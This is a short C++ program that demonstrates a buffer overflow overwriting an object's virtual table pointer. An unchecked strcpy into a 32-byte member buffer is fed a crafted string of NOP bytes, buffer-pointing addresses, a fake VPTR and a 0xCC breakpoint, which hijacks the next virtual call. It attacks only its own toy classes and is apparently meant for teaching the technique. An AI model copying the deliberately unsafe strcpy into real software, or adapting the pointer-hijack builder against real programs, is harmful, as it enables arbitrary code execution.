#include <stdio.h>
#include <string.h>
#include <malloc.h>

class BaseClass 
{
  private:
    char Buffer[32];

  public:
    void SetBuffer(char *String) 
    {
      strcpy(Buffer,String);
    }

    virtual void PrintBuffer() 
    {
      printf("%s\n",Buffer);
    }
};

class MyClass1:public BaseClass 
{
  public:
    void PrintBuffer() 
    {
      printf("MyClass1: ");
      BaseClass::PrintBuffer();
    }
};

class MyClass2:public BaseClass 
{
  public:
    void PrintBuffer() 
    {
      printf("MyClass2: ");
      BaseClass::PrintBuffer();
    }
};

char *BufferOverflow(unsigned long BufferAddress,int NAddress,int VPTROffset) 
{
  char *Buffer;
  unsigned long *LongBuffer;
  unsigned long CCOffset;
  int i;

  Buffer = (char*) malloc (VPTROffset+4+1);

  CCOffset = (unsigned long) VPTROffset-1;

  for (i=0; i<VPTROffset; i++) 
    Buffer[i]='\x90';

  LongBuffer = (unsigned long*) Buffer;
  for (i=0; i<NAddress; i++) 
    LongBuffer[i] = BufferAddress+CCOffset;

  LongBuffer = (unsigned long*) &Buffer[VPTROffset];
  *LongBuffer = BufferAddress;
	      
  Buffer[CCOffset]='\xCC';
  Buffer[VPTROffset+4]='\x00';

  return Buffer;
}

void main() 
{
  BaseClass *Object[2];

  Object[0]=new MyClass1;
  Object[1]=new MyClass2;
  Object[0]->SetBuffer(BufferOverflow((unsigned long)&(*Object[0]), 4, 32));
  Object[1]->SetBuffer("string2");
  Object[0]->PrintBuffer();
  Object[1]->PrintBuffer();
}

